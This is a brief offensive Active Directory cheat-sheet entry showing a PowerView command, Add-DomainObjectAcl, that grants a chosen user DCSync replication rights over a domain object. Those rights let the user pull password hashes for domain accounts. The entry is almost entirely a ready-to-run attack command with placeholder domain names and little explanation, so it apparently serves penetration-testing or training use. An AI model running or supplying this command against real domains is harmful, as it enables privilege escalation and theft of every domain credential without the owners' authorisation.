# Modify Domain Settings

## Allow Your User To Execute DCSync Attack

Allow your user to execute DCSync attack.

```
. C:\AD\Tools\PowerView.ps1
PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity 'DC=test,DC=test.corp,DC=local' -PrincipalIdentity test -Rights DCSync -PrincipalDomain test.corp.local -TargetDomain test.local -Verbose
```
